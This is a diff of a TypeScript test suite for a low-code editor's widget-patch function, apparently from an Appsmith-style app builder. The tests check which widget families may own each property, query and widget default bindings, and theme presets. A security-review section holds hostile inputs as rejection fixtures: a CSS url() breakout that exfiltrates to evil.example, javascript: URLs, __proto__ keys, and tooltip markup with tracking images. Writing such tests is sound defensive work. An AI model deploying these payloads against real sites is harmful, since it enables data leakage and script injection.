@@ -1,6 +1,11 @@
 import { z } from "zod";
 import type { WidgetNode } from "./layout.js";
-import { applyWidgetPatch, widgetPatchSchema } from "./editPatch.js";
+import {
+  applyWidgetPatch,
+  LITERAL_PROP_OWNERS,
+  widgetPatchSchema,
+  widgetPropsPatchSchema,
+} from "./editPatch.js";
 import {
   compileInputValidation,
   INPUT_VALIDATION_FORMATS,
@@ -1532,6 +1537,268 @@ describe("applyWidgetPatch", () => {
     ).toThrow("has children");
   });
 
+  it("accepts the caption/default literals of the checkbox/switch/radio/select family and MULTI_LINE_TEXT, type-checked", () => {
+    // Checkbox / switch / radio keep their caption in `label`; `labelText` is the select / multiselect caption
+    // (the property panes own the names). The audit corrected the earlier guard, which admitted labelText here.
+    const checkbox = node({
+      widgetId: "cb",
+      widgetName: "Agree",
+      type: "CHECKBOX_WIDGET",
+    });
+    const select = node({
+      widgetId: "sel",
+      widgetName: "Tone",
+      type: "SELECT_WIDGET",
+    });
+    const toggle = node({
+      widgetId: "sw",
+      widgetName: "Enabled",
+      type: "SWITCH_WIDGET",
+    });
+    const input = node({
+      widgetId: "in",
+      widgetName: "Message",
+      type: "INPUT_WIDGET_V2",
+      inputType: "TEXT",
+    });
+    const dsl = node({
+      widgetId: "0",
+      widgetName: "MainContainer",
+      type: "CANVAS_WIDGET",
+      children: [checkbox, select, input, toggle],
+    });
+    const { dsl: patched } = applyWidgetPatch(dsl, {
+      operations: [
+        {
+          kind: "update",
+          name: "Agree",
+          props: { label: "I agree", defaultCheckedState: true },
+        },
+        {
+          kind: "update",
+          name: "Enabled",
+          props: { label: "Enabled", defaultSwitchState: false },
+        },
+        {
+          kind: "update",
+          name: "Tone",
+          props: { defaultOptionValue: "INFO", labelText: "Tone" },
+        },
+        {
+          kind: "update",
+          name: "Message",
+          props: { inputType: "MULTI_LINE_TEXT" },
+        },
+      ],
+    });
+    const byName = (name: string) =>
+      patched.children!.find((w) => w.widgetName === name)!;
+
+    expect(byName("Agree").label).toBe("I agree");
+    expect(byName("Agree").labelText).toBeUndefined();
+    expect(byName("Agree").defaultCheckedState).toBe(true);
+    expect(byName("Enabled").label).toBe("Enabled");
+    expect(byName("Enabled").defaultSwitchState).toBe(false);
+    expect(byName("Tone").defaultOptionValue).toBe("INFO");
+    expect(byName("Tone").labelText).toBe("Tone");
+    expect(byName("Message").inputType).toBe("MULTI_LINE_TEXT");
+
+    // The same literals on the wrong widget family are rejected, never silently written as dead props.
+    expect(() =>
+      applyWidgetPatch(dsl, {
+        operations: [
+          {
+            kind: "update",
+            name: "Tone",
+            props: { defaultCheckedState: true },
+          },
+        ],
+      }),
+    ).toThrow("'defaultCheckedState' can only be set on CHECKBOX_WIDGET");
+    expect(() =>
+      applyWidgetPatch(dsl, {
+        operations: [
+          {
+            kind: "update",
+            name: "Agree",
+            props: { inputType: "MULTI_LINE_TEXT" },
+          },
+        ],
+      }),
+    ).toThrow("'inputType' can only be set on INPUT_WIDGET_V2");
+    expect(() =>
+      applyWidgetPatch(dsl, {
+        operations: [
+          { kind: "update", name: "Message", props: { labelText: "x" } },
+        ],
+      }),
+    ).toThrow(/'labelText' can only be set on .*SELECT_WIDGET/);
+    // labelText on a checkbox was a dead property before the audit; it is now refused with the owners named.
+    expect(() =>
+      applyWidgetPatch(dsl, {
+        operations: [
+          { kind: "update", name: "Agree", props: { labelText: "x" } },
+        ],
+      }),
+    ).toThrow(/'labelText' can only be set on .*SELECT_WIDGET/);
+    expect(() =>
+      applyWidgetPatch(dsl, {
+        operations: [{ kind: "update", name: "Tone", props: { label: "x" } }],
+      }),
+    ).toThrow("'label' can only be set on");
+
+    // Still literal-only: a binding in labelText / defaultOptionValue is rejected by the schema.
+    for (const props of [
+      { labelText: "{{ Query.data }}" },
+      { defaultOptionValue: "${x}" },
+      { inputType: "{{ x }}" },
+    ]) {
+      expect(
+        widgetPatchSchema.safeParse({
+          operations: [{ kind: "update", name: "Agree", props }],
+        }).success,
+      ).toBe(false);
+    }
+  });
+
+  it("binds a widget's default to another widget's property or a query field via defaultFrom", () => {
+    const select = node({
+      widgetId: "sel",
+      widgetName: "Tone",
+      type: "SELECT_WIDGET",
+    });
+    const source = node({
+      widgetId: "tbl",
+      widgetName: "Banners",
+      type: "TABLE_WIDGET_V2",
+    });
+    const toggle = node({
+      widgetId: "sw",
+      widgetName: "Enabled",
+      type: "SWITCH_WIDGET",
+    });
+    const picker = node({
+      widgetId: "dt",
+      widgetName: "StartsAt",
+      type: "DATE_PICKER_WIDGET2",
+    });
+    const text = node({
+      widgetId: "t",
+      widgetName: "Title",
+      type: "TEXT_WIDGET",
+    });
+    const dsl = node({
+      widgetId: "0",
+      widgetName: "MainContainer",
+      type: "CANVAS_WIDGET",
+      children: [select, source, toggle, picker, text],
+    });
+    const { dsl: patched } = applyWidgetPatch(dsl, {
+      operations: [
+        {
+          kind: "update",
+          name: "Tone",
+          props: {
+            defaultFrom: { widget: "Banners", property: "selectedRow.tone" },
+          },
+        },
+        {
+          kind: "update",
+          name: "Enabled",
+          props: { defaultFrom: { query: "GetSettings", field: "enabled" } },
+        },
+        {
+          kind: "update",
+          name: "StartsAt",
+          props: {
+            defaultFrom: {
+              widget: "Banners",
+              property: "selectedRow.startsAt",
+            },
+          },
+        },
+      ],
+    });
+    const byName = (name: string) =>
+      patched.children!.find((w) => w.widgetName === name)!;
+
+    expect(byName("Tone").defaultOptionValue).toBe(
+      "{{ Banners.selectedRow.tone }}",
+    );
+    expect(byName("Tone").dynamicBindingPathList).toEqual([
+      { key: "defaultOptionValue" },
+    ]);
+    expect(byName("Enabled").defaultSwitchState).toBe(
+      '{{ GetSettings.data?.enabled ?? "" }}',
+    );
+    expect(byName("StartsAt").defaultDate).toBe(
+      "{{ Banners.selectedRow.startsAt }}",
+    );
+
+    // Wrong family, dangling source, self-reference, and a racing literal are all refused.
+    expect(() =>
+      applyWidgetPatch(dsl, {
+        operations: [
+          {
+            kind: "update",
+            name: "Title",
+            props: { defaultFrom: { widget: "Banners", property: "x" } },
+          },
+        ],
+      }),
+    ).toThrow("'defaultFrom' can only be set on");
+    expect(() =>
+      applyWidgetPatch(dsl, {
+        operations: [
+          {
+            kind: "update",
+            name: "Tone",
+            props: { defaultFrom: { widget: "Nope", property: "x" } },
+          },
+        ],
+      }),
+    ).toThrow('widget "Nope" was not found');
+    expect(() =>
+      applyWidgetPatch(dsl, {
+        operations: [
+          {
+            kind: "update",
+            name: "Tone",
+            props: { defaultFrom: { widget: "Tone", property: "x" } },
+          },
+        ],
+      }),
+    ).toThrow("cannot reference the widget itself");
+    expect(() =>
+      applyWidgetPatch(dsl, {
+        operations: [
+          {
+            kind: "update",
+            name: "Tone",
+            props: {
+              defaultFrom: { widget: "Banners", property: "x" },
+              defaultOptionValue: "INFO",
+            },
+          },
+        ],
+      }),
+    ).toThrow("cannot set both 'defaultOptionValue' and 'defaultFrom'");
+
+    for (const defaultFrom of [
+      { widget: "Banners", property: "a[0]" },
+      { widget: "B", property: "{{x}}" },
+      { widget: "B" },
+    ]) {
+      expect(
+        widgetPatchSchema.safeParse({
+          operations: [
+            { kind: "update", name: "Tone", props: { defaultFrom } },
+          ],
+        }).success,
+      ).toBe(false);
+    }
+  });
+
   it("rejects raw bindings, templates, and non-allowlisted properties", () => {
     for (const text of ["{{ Query.data }}", "${dangerous}", "`dangerous`"]) {
       expect(
@@ -1937,11 +2204,19 @@ describe("applyWidgetPatch — resize", () => {
       }),
     ).toThrow(/smallest rows that fit the children: 30/);
 
-    expect(() =>
-      applyWidgetPatch(dsl, {
-        operations: [{ kind: "resize", name: "Card", columns: 10 }],
-      }),
-    ).toThrow(/smallest columns that fit the children: 24/);
+    // Columns are NOT constrained by the children: they live in the inner canvas's own 64-column grid, which the
+    // client scales to the container's pixel width, so a narrow container still holds full-width fields.
+    const { dsl: narrowed } = applyWidgetPatch(dsl, {
+      operations: [{ kind: "resize", name: "Card", columns: 10 }],
+    });
+    const narrowedCard = narrowed.children!.find(
+      (w) => w.widgetName === "Card",
+    )!;
+
+    expect(
+      (narrowedCard.rightColumn as number) -
+        (narrowedCard.leftColumn as number),
+    ).toBe(10);
   });
 
   it("shrinks a container down to (but not past) its children, keeping the inner canvas in step", () => {
@@ -2054,6 +2329,1471 @@ describe("applyWidgetPatch — resize", () => {
       widgetPatchSchema.safeParse({
         operations: [
           { kind: "resize", name: "Card", rows: 12, columns: 20, strict: true },
+        ],
+      }).success,
+    ).toBe(true);
+  });
+});
+
+describe("applyWidgetPatch — widget-property audit (APP-16052)", () => {
+  function widgets(): WidgetNode {
+    return node({
+      widgetId: "0",
+      widgetName: "MainContainer",
+      type: "CANVAS_WIDGET",
+      children: [
+        node({
+          widgetId: "t",
+          widgetName: "Banners",
+          type: "TABLE_WIDGET_V2",
+          multiRowSelection: false,
+          defaultSelectedRowIndex: 0,
+          borderRadius: "{{appsmith.theme.borderRadius.appBorderRadius}}",
+          boxShadow: "{{appsmith.theme.boxShadow.appBoxShadow}}",
+          accentColor: "{{appsmith.theme.colors.primaryColor}}",
+          dynamicBindingPathList: [
+            { key: "borderRadius" },
+            { key: "boxShadow" },
+            { key: "accentColor" },
+          ],
+        }),
+        node({
+          widgetId: "m",
+          widgetName: "Picks",
+          type: "TABLE_WIDGET_V2",
+          multiRowSelection: true,
+        }),
+        node({
+          widgetId: "tx",
+          widgetName: "Title",
+          type: "TEXT_WIDGET",
+          text: "Hi",
+        }),
+        node({
+          widgetId: "in",
+          widgetName: "Email",
+          type: "INPUT_WIDGET_V2",
+          inputType: "EMAIL",
+        }),
+        node({ widgetId: "b", widgetName: "Save", type: "BUTTON_WIDGET" }),
+        node({
+          widgetId: "ms",
+          widgetName: "Tags",
+          type: "MULTI_SELECT_WIDGET_V2",
+        }),
+        node({ widgetId: "s", widgetName: "Tone", type: "SELECT_WIDGET" }),
+        node({
+          widgetId: "d",
+          widgetName: "StartsAt",
+          type: "DATE_PICKER_WIDGET2",
+        }),
+        node({
+          widgetId: "f",
+          widgetName: "Upload",
+          type: "FILE_PICKER_WIDGET_V2",
+        }),
+        node({ widgetId: "c", widgetName: "Sales", type: "CHART_WIDGET" }),
+        node({ widgetId: "i", widgetName: "Photo", type: "IMAGE_WIDGET" }),
+      ],
+    });
+  }
+
+  const byName = (dsl: WidgetNode, name: string) =>
+    dsl.children!.find((w) => w.widgetName === name)!;
+
+  it("sets a table's default selected row in the mode the table is in, with -1 meaning no default", () => {
+    const { changes, dsl } = applyWidgetPatch(widgets(), {
+      operations: [
+        {
+          kind: "update",
+          name: "Banners",
+          props: { defaultSelectedRowIndex: 2 },
+        },
+        {
+          kind: "update",
+          name: "Picks",
+          props: { defaultSelectedRowIndices: [0, 3] },
+        },
+      ],
+    });
+
+    expect(byName(dsl, "Banners").defaultSelectedRowIndex).toBe(2);
+    expect(byName(dsl, "Picks").defaultSelectedRowIndices).toEqual([0, 3]);
+    expect(changes.map((c) => c.changedProps)).toEqual([
+      ["defaultSelectedRowIndex"],
+      ["defaultSelectedRowIndices"],
+    ]);
+
+    const cleared = applyWidgetPatch(widgets(), {
+      operations: [
+        {
+          kind: "update",
+          name: "Banners",
+          props: { defaultSelectedRowIndex: -1 },
+        },
+      ],
+    }).dsl;
+
+    expect(byName(cleared, "Banners").defaultSelectedRowIndex).toBe(-1);
+
+    // Below the pane's own minimum, a fraction, or a non-table are refused.
+    for (const props of [
+      { defaultSelectedRowIndex: -2 },
+      { defaultSelectedRowIndex: 1.5 },
+      { defaultSelectedRowIndices: [-1] },
+      { defaultSelectedRowIndex: "{{ x }}" },
+    ]) {
+      expect(
+        widgetPatchSchema.safeParse({
+          operations: [{ kind: "update", name: "Banners", props }],
+        }).success,
+      ).toBe(false);
+    }
+
+    expect(() =>
+      applyWidgetPatch(widgets(), {
+        operations: [
+          {
+            kind: "update",
+            name: "Title",
+            props: { defaultSelectedRowIndex: 0 },
+          },
+        ],
+      }),
+    ).toThrow("'defaultSelectedRowIndex' can only be set on TABLE_WIDGET_V2");
+  });
+
+  it("refuses the default-row prop of the other selection mode, unless the mode is switched in the same update", () => {
+    expect(() =>
+      applyWidgetPatch(widgets(), {
+        operations: [
+          {
+            kind: "update",
+            name: "Banners",
+            props: { defaultSelectedRowIndices: [0] },
+          },
+        ],
+      }),
+    ).toThrow(
+      "'defaultSelectedRowIndices' applies while multi-row selection is on",
+    );
+    expect(() =>
+      applyWidgetPatch(widgets(), {
+        operations: [
+          {
+            kind: "update",
+            name: "Picks",
+            props: { defaultSelectedRowIndex: 0 },
+          },
+        ],
+      }),
+    ).toThrow(
+      "'defaultSelectedRowIndex' applies while multi-row selection is off",
+    );
+
+    const { dsl } = applyWidgetPatch(widgets(), {
+      operations: [
+        {
+          kind: "update",
+          name: "Banners",
+          props: { multiRowSelection: true, defaultSelectedRowIndices: [1] },
+        },
+        {
+          kind: "update",
+          name: "Picks",
+          props: { multiRowSelection: false, defaultSelectedRowIndex: 4 },
+        },
+      ],
+    });
+
+    expect(byName(dsl, "Banners")).toMatchObject({
+      multiRowSelection: true,
+      defaultSelectedRowIndices: [1],
+    });
+    expect(byName(dsl, "Picks")).toMatchObject({
+      multiRowSelection: false,
+      defaultSelectedRowIndex: 4,
+    });
+  });
+
+  it("binds a table's default row to another widget or a query field via defaultFrom, by selection mode", () => {
+    const { dsl } = applyWidgetPatch(widgets(), {
+      operations: [
+        {
+          kind: "update",
+          name: "Banners",
+          props: { defaultFrom: { query: "GetRowIndex", field: "index" } },
+        },
+        {
+          kind: "update",
+          name: "Picks",
+          props: {
+            defaultFrom: { widget: "Banners", property: "selectedRowIndices" },
+          },
+        },
+      ],
+    });
+
+    expect(byName(dsl, "Banners").defaultSelectedRowIndex).toBe(
+      '{{ GetRowIndex.data?.index ?? "" }}',
+    );
+    expect(byName(dsl, "Banners").dynamicBindingPathList).toEqual(
+      expect.arrayContaining([{ key: "defaultSelectedRowIndex" }]),
+    );
+    expect(byName(dsl, "Picks").defaultSelectedRowIndices).toBe(
+      "{{ Banners.selectedRowIndices }}",
+    );
+
+    // A racing literal for the same prop is still ambiguous.
+    expect(() =>
+      applyWidgetPatch(widgets(), {
+        operations: [
+          {
+            kind: "update",
+            name: "Banners",
+            props: {
+              defaultFrom: { query: "Q" },
+              defaultSelectedRowIndex: 1,
+            },
+          },
+        ],
+      }),
+    ).toThrow("cannot set both 'defaultSelectedRowIndex' and 'defaultFrom'");
+  });
+
+  it("accepts theme presets by name for radius and shadow, stores the pane's value, and drops the theme binding", () => {
+    const { dsl } = applyWidgetPatch(widgets(), {
+      operations: [
+        {
+          kind: "update",
+          name: "Banners",
+          props: {
+            borderRadius: "M",
+            boxShadow: "L",
+            accentColor: "#553de9",
+            headerRowColor: "#f5f5f5",
+            compactMode: "SHORT",
+            textSize: "1rem",
+            fontStyle: "BOLD,ITALIC",
+            variant: "VARIANT2",
+          },
+        },
+      ],
+    });
+    const table = byName(dsl, "Banners");
+
+    expect(table).toMatchObject({
+      borderRadius: "0.375rem",
+      boxShadow:
+        "0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05)",
+      accentColor: "#553de9",
+      headerRowColor: "#f5f5f5",
+      compactMode: "SHORT",
+      textSize: "1rem",
+      fontStyle: "BOLD,ITALIC",
+      variant: "VARIANT2",
+    });
+    // The theme bindings those style props carried by default are unregistered, so the literal is what renders.
+    expect(table.dynamicBindingPathList).toEqual([]);
+
+    // The exact CSS value is accepted too and round-trips unchanged.
+    const exact = applyWidgetPatch(widgets(), {
+      operations: [
+        {
+          kind: "update",
+          name: "Banners",
+          props: { borderRadius: "1.5rem", boxShadow: "none" },
+        },
+      ],
+    }).dsl;
+
+    expect(byName(exact, "Banners")).toMatchObject({
+      borderRadius: "1.5rem",
+      boxShadow: "none",
+    });
+
+    // Anything outside the preset table is refused: free CSS, url(), bindings, unknown sizes.
+    for (const props of [
+      { borderRadius: "10px" },
+      { boxShadow: "0 0 0 1px red" },
+      { boxShadow: "url(x)" },
+      { accentColor: "url(javascript:1)" },
+      { accentColor: "{{ appsmith.theme.colors.primaryColor }}" },
+      { fontStyle: "BOLD,BOLD,BOLD,BOLD" },
+      { fontStyle: "bold" },
+      { fontStyle: "UNDERLINE" },
+      { delimiter: '"' },
+      { delimiter: ",," },
+      { textSize: "3rem" },
+      { compactMode: "HUGE" },
+    ]) {
+      expect(
+        widgetPatchSchema.safeParse({
+          operations: [{ kind: "update", name: "Banners", props }],
+        }).success,
+      ).toBe(false);
+    }
+  });
+
+  it("sets typography, label, icon, chart, image, date and file-picker literals on their own widget families", () => {
+    const { dsl } = applyWidgetPatch(widgets(), {
+      operations: [
+        {
+          kind: "update",
+          name: "Title",
+          props: {
+            fontFamily: "Inter",
+            fontSize: "1.25rem",
+            textAlign: "CENTER",
+            fontStyle: "BOLD",
+            overflow: "TRUNCATE",
+            borderWidth: 1,
+            borderColor: "rgba(0, 0, 0, 0.2)",
+            disableLink: true,
+          },
+        },
+        {
+          kind: "update",
+          name: "Email",
+          props: {
+            label: "Email",
+            labelPosition: "Top",
+            labelAlignment: "left",
+            labelWidth: 5,
+            labelTextSize: "0.875rem",
+            labelStyle: "BOLD",
+            labelTextColor: "#333333",
+            tooltip: "Work address",
+            maxChars: 120,
+            iconName: "envelope",
+            iconAlign: "left",
+            autoFocus: true,
+            rtl: false,
+            borderRadius: "none",
+          },
+        },
+        {
+          kind: "update",
+          name: "Save",
+          props: {
+            buttonVariant: "SECONDARY",
+            placement: "CENTER",
+            buttonColor: "#16a34a",
+            iconName: "floppy-disk",
+            disabledWhenInvalid: true,
+            resetFormOnClick: true,
+          },
+        },
+        {
+          kind: "update",
+          name: "Tags",
+          props: {
+            labelText: "Tags",
+            defaultOptionValue: ["a", "b"],
+            allowSelectAll: true,
+            isFilterable: true,
+          },
+        },
+        {
+          kind: "update",
+          name: "StartsAt",
+          props: {
+            defaultDate: "2026-10-01",
+            minDate: "2026-01-01T00:00:00Z",
+            maxDate: "2026-12-31",
+            firstDayOfWeek: 1,
+            timePrecision: "minute",
+            closeOnSelection: true,
+          },
+        },
+        {
+          kind: "update",
+          name: "Upload",
+          props: {
+            allowedFileTypes: ["image/*", ".png"],
+            fileDataType: "Base64",
+            maxNumFiles: 3,
+            maxFileSize: 10,
+            buttonColor: "#000000",
+          },
+        },
+        {
+          kind: "update",
+          name: "Sales",
+          props: {
+            xAxisName: "Month",
+            yAxisName: "Revenue",
+            labelOrientation: "slant",
+            showDataPointLabel: true,
+            setAdaptiveYMin: true,
+          },
+        },
+        {
+          kind: "update",
+          name: "Photo",
+          props: {
+            objectFit: "cover",
+            maxZoomLevel: 4,
+            enableDownload: true,
+            defaultImage: "https://example.com/placeholder.png?v=2",
+          },
+        },
+      ],
+    });
+
+    expect(byName(dsl, "Title")).toMatchObject({
+      fontFamily: "Inter",
+      fontSize: "1.25rem",
+      textAlign: "CENTER",
+      fontStyle: "BOLD",
+      overflow: "TRUNCATE",
+      borderWidth: 1,
+      borderColor: "rgba(0, 0, 0, 0.2)",
+      disableLink: true,
+    });
+    expect(byName(dsl, "Email")).toMatchObject({
+      label: "Email",
+      labelPosition: "Top",
+      labelWidth: 5,
+      labelStyle: "BOLD",
+      maxChars: 120,
+      iconName: "envelope",
+      borderRadius: "0px",
+    });
+    expect(byName(dsl, "Save")).toMatchObject({
+      buttonVariant: "SECONDARY",
+      placement: "CENTER",
+      buttonColor: "#16a34a",
+      iconName: "floppy-disk",
+    });
+    expect(byName(dsl, "Tags")).toMatchObject({
+      labelText: "Tags",
+      defaultOptionValue: ["a", "b"],
+      allowSelectAll: true,
+    });
+    expect(byName(dsl, "StartsAt")).toMatchObject({
+      defaultDate: "2026-10-01",
+      minDate: "2026-01-01T00:00:00Z",
+      firstDayOfWeek: 1,
+      timePrecision: "minute",
+    });
+    expect(byName(dsl, "Upload")).toMatchObject({
+      allowedFileTypes: ["image/*", ".png"],
+      fileDataType: "Base64",
+      maxNumFiles: 3,
+      maxFileSize: 10,
+    });
+    expect(byName(dsl, "Sales")).toMatchObject({
+      xAxisName: "Month",
+      labelOrientation: "slant",
+    });
+    expect(byName(dsl, "Photo")).toMatchObject({
+      objectFit: "cover",
+      maxZoomLevel: 4,
+      defaultImage: "https://example.com/placeholder.png?v=2",
+    });
+
+    // Every literal is a closed value: unknown enum members, out-of-range numbers, impossible dates, non-kebab
+    // icon names and bindings are refused by the schema.
+    for (const [name, props] of [
+      ["Title", { fontFamily: "Comic Sans" }],
+      ["Title", { fontSize: "2rem" }],
+      ["Title", { borderWidth: 51 }],
+      ["Email", { labelPosition: "Bottom" }],
+      ["Email", { labelWidth: 65 }],
+      ["Email", { maxChars: 0 }],
+      ["Email", { iconName: "Envelope" }],
+      ["Email", { iconName: "envelope; url(x)" }],
+      ["Email", { labelStyle: "BOLD,ITALIC,UNDERLINE" }],
+      ["Save", { buttonVariant: "LINK" }],
+      ["Save", { tooltip: "{{ x }}" }],
+      ["StartsAt", { defaultDate: "2026-02-30" }],
+      ["StartsAt", { minDate: "yesterday" }],
+      ["StartsAt", { firstDayOfWeek: 7 }],
+      ["StartsAt", { timePrecision: "hour" }],
+      ["Upload", { allowedFileTypes: [".exe"] }],
+      ["Upload", { maxFileSize: 201 }],
+      ["Sales", { labelOrientation: "upside-down" }],
+      ["Photo", { maxZoomLevel: 3 }],
+      ["Photo", { objectFit: "url(x)" }],
+    ] as const) {
+      expect(
+        widgetPatchSchema.safeParse({
+          operations: [{ kind: "update", name, props }],
+        }).success,
+      ).toBe(false);
+    }
+  });
+
+  it("refuses a family-specific literal on a widget that does not own it, and array/scalar defaults on the wrong select", () => {
+    const wrong: [string, Record<string, unknown>, string][] = [
+      [
+        "Title",
+        { maxChars: 5 },
+        "'maxChars' can only be set on INPUT_WIDGET_V2",
+      ],
+      [
+        "Email",
+        { fontFamily: "Inter" },
+        "'fontFamily' can only be set on TEXT_WIDGET",
+      ],
+      [
+        "Save",
+        { defaultDate: "2026-01-01" },
+        "'defaultDate' can only be set on DATE_PICKER_WIDGET2",
+      ],
+      [
+        "Banners",
+        { allowedFileTypes: ["*"] },
+        "'allowedFileTypes' can only be set on FILE_PICKER_WIDGET_V2",
+      ],
+      [
+        "Title",
+        { canOutsideClickClose: true },
+        "'canOutsideClickClose' can only be set on MODAL_WIDGET",
+      ],
+      [
+        "Title",
+        { buttonColor: "#000000" },
+        "'buttonColor' can only be set on BUTTON_WIDGET / CODE_SCANNER_WIDGET",
+      ],
+      [
+        "Tone",
+        { placement: "START" },
+        "'placement' can only be set on BUTTON_WIDGET",
+      ],
+      ["Tone", { defaultOptionValue: ["a"] }, "must be a single option value"],
+      [
+        "Tags",
+        { defaultOptionValue: "a" },
+        "must be an array of option values",
+      ],
+      ["Tone", { labelTooltip: "x", isVisible: true }, ""],
+    ];
+
+    for (const [name, props, message] of wrong) {
+      const run = () =>
+        applyWidgetPatch(widgets(), {
+          operations: [{ kind: "update", name, props }],
+        });
+
+      if (message === "") expect(run).not.toThrow();
+      else expect(run).toThrow(message);
+    }
+  });
+
+  it("keeps table data-mode, adding-row and search literals on the table only", () => {
+    const { dsl } = applyWidgetPatch(widgets(), {
+      operations: [
+        {
+          kind: "update",
+          name: "Banners",
+          props: {
+            primaryColumnId: "id",
+            serverSidePaginationEnabled: true,
+            enableServerSideFiltering: false,
+            defaultSearchText: "active",
+            allowAddNewRow: true,
+            defaultNewRow: { tone: "INFO", priority: 1, enabled: true },
+            canFreezeColumn: true,
+            delimiter: "\t",
+            inlineEditingSaveOption: "ROW_LEVEL",
+            horizontalAlignment: "LEFT",
+            verticalAlignment: "CENTER",
+            cellBackground: "#ffffff",
+            headerTextColor: "#111111",
+          },
+        },
+      ],
+    });
+
+    expect(byName(dsl, "Banners")).toMatchObject({
+      primaryColumnId: "id",
+      serverSidePaginationEnabled: true,
+      defaultSearchText: "active",
+      defaultNewRow: { tone: "INFO", priority: 1, enabled: true },
+      delimiter: "\t",
+      inlineEditingSaveOption: "ROW_LEVEL",
+    });
+
+    for (const props of [
+      { defaultNewRow: { tone: "{{ x }}" } },
+      // A wire payload's "__proto__" key is an own key after JSON.parse (an object literal's is not), and both it
+      // and "constructor" are prototype names the column-name grammar refuses.
+      { defaultNewRow: JSON.parse('{"__proto__": "x"}') },
+      { defaultNewRow: { constructor: "x" } },
+      { defaultNewRow: { a$b: 1 } },
+      { defaultNewRow: { nested: { a: 1 } } },
+      { primaryColumnId: "constructor" },
+      { delimiter: "" },
+    ]) {
+      expect(
+        widgetPatchSchema.safeParse({
+          operations: [{ kind: "update", name: "Banners", props }],
+        }).success,
+      ).toBe(false);
+    }
+  });
+});
+
+describe("applyWidgetPatch — owners cover every buildable widget type", () => {
+  it("keeps label / placeholderText / backgroundColor working on the types outside the 18 inventoried ones", () => {
+    const dsl = node({
+      widgetId: "0",
+      widgetName: "MainContainer",
+      type: "CANVAS_WIDGET",
+      children: [
+        node({
+          widgetId: "c",
+          widgetName: "Price",
+          type: "CURRENCY_INPUT_WIDGET",
+        }),
+        node({ widgetId: "s", widgetName: "Kpi", type: "STATBOX_WIDGET" }),
+        node({
+          widgetId: "t",
+          widgetName: "Tree",
+          type: "MULTI_SELECT_TREE_WIDGET",
+        }),
+        node({ widgetId: "cb", widgetName: "Agree", type: "CHECKBOX_WIDGET" }),
+        node({
+          widgetId: "j",
+          widgetName: "Editor",
+          type: "JSON_FORM_WIDGET",
+          borderColor: "{{appsmith.theme.colors.primaryColor}}",
+          dynamicBindingPathList: [{ key: "borderColor" }],
+          dynamicPropertyPathList: [{ key: "borderColor" }],
+        }),
+      ],
+    });
+    const { dsl: patched } = applyWidgetPatch(dsl, {
+      operations: [
+        {
+          kind: "update",
+          name: "Price",
+          props: { label: "Amount", placeholderText: "0.00", tooltip: "USD" },
+        },
+        { kind: "update", name: "Kpi", props: { backgroundColor: "#fafafa" } },
+        {
+          kind: "update",
+          name: "Tree",
+          props: {
+            placeholderText: "Pick",
+            defaultOptionValue: ["a"],
+            labelText: "Tags",
+          },
+        },
+        { kind: "update", name: "Agree", props: { labelPosition: "Right" } },
+        { kind: "update", name: "Editor", props: { borderColor: "#111111" } },
+      ],
+    });
+    const byName = (name: string) =>
+      patched.children!.find((w) => w.widgetName === name)!;
+
+    expect(byName("Price")).toMatchObject({
+      label: "Amount",
+      placeholderText: "0.00",
+      tooltip: "USD",
+    });
+    expect(byName("Kpi").backgroundColor).toBe("#fafafa");
+    expect(byName("Tree")).toMatchObject({
+      placeholderText: "Pick",
+      defaultOptionValue: ["a"],
+      labelText: "Tags",
+    });
+    expect(byName("Agree").labelPosition).toBe("Right");
+    // A literal clears both the binding list and the JS-mode list.
+    expect(byName("Editor").borderColor).toBe("#111111");
+    expect(byName("Editor").dynamicBindingPathList).toEqual([]);
+    expect(byName("Editor").dynamicPropertyPathList).toEqual([]);
+
+    // Checkbox / switch panes offer only Left / Right.
+    expect(() =>
+      applyWidgetPatch(dsl, {
+        operations: [
+          { kind: "update", name: "Agree", props: { labelPosition: "Top" } },
+        ],
+      }),
+    ).toThrow("'labelPosition' on a CHECKBOX_WIDGET must be Left | Right");
+    // A statbox has no textColor pane prop; refused with the owners named.
+    expect(() =>
+      applyWidgetPatch(dsl, {
+        operations: [
+          { kind: "update", name: "Kpi", props: { textColor: "#000000" } },
+        ],
+      }),
+    ).toThrow("'textColor' can only be set on TABLE_WIDGET_V2 / TEXT_WIDGET");
+  });
+});
+
+describe("applyWidgetPatch — security review of the audit (image URL, tooltip markup, label position)", () => {
+  const dsl = () =>
+    node({
+      widgetId: "0",
+      widgetName: "MainContainer",
+      type: "CANVAS_WIDGET",
+      children: [
+        node({ widgetId: "i", widgetName: "Photo", type: "IMAGE_WIDGET" }),
+        node({ widgetId: "b", widgetName: "Save", type: "BUTTON_WIDGET" }),
+        node({ widgetId: "e", widgetName: "Email", type: "INPUT_WIDGET_V2" }),
+        node({
+          widgetId: "d",
+          widgetName: "StartsAt",
+          type: "DATE_PICKER_WIDGET2",
+        }),
+        node({ widgetId: "c", widgetName: "Agree", type: "CHECKBOX_WIDGET" }),
+        node({ widgetId: "s", widgetName: "On", type: "SWITCH_WIDGET" }),
+      ],
+    });
+
+  it("refuses an image source that could break out of the widget's CSS url() rule, and normalises the rest", () => {
+    const breakout =
+      'https://evil.example/x.png?q=") } input[value^="a"] { background: url("https://evil.example/leak?a") } .x { a: url("';
+
+    for (const props of [
+      { image: breakout },
+      { defaultImage: breakout },
+      { image: "https://a.example/x.png' )" },
+      { image: "https://a.example/(x).png" },
+      { image: "javascript:alert(1)" },
+      { image: "data:image/png;base64,iVBORw0KGgo=" },
+      { image: "https://user:pw@a.example/x.png" },
+      { image: "//a.example/x.png" },
+      { image: "{{ Q.data }}" },
+    ]) {
+      expect(
+        widgetPatchSchema.safeParse({
+          operations: [{ kind: "update", name: "Photo", props }],
+        }).success,
+      ).toBe(false);
+    }
+
+    const { dsl: patched } = applyWidgetPatch(dsl(), {
+      operations: [
+        {
+          kind: "update",
+          name: "Photo",
+          props: {
+            image: "HTTPS://A.Example/pics/x y.png?q=1",
+            defaultImage: "https://a.example/placeholder.png",
+          },
+        },
+      ],
+    });
+
+    // WHATWG normalisation: lower-cased scheme/host, percent-encoded space.
+    expect(patched.children![0].image).toBe(
+      "https://a.example/pics/x%20y.png?q=1",
+    );
+    expect(patched.children![0].defaultImage).toBe(
+      "https://a.example/placeholder.png",
+    );
+  });
+
+  it("refuses markup in a button or label tooltip", () => {
+    for (const [name, props] of [
+      ["Save", { tooltip: '<a href="https://evil.example">Reset</a>' }],
+      ["Save", { tooltip: "x <img src=https://evil.example/px>" }],
+      ["Email", { tooltip: "<b>hi</b>" }],
